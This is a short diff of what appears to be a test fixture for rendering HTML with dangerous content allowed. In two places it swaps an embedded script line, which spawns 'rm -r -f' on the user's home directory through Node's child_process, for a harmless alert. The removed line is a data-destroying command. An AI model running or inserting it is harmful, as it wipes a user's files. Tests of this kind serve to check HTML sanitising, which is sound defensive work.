@@ -67,7 +67,7 @@
         </math>
       </div>
       <script>
-      require('child_process').spawn('rm', ['-r', '-f', process.env.HOME]);
+        alert('script tag');
       </script>
 
 - id: properties.allowDangerousHtml = true
@@ -92,7 +92,7 @@
         </math>
       </div>
       <script>
-      require('child_process').spawn('rm', ['-r', '-f', process.env.HOME]);
+        alert('script tag');
       </script>
 
 - id: properties.content with code
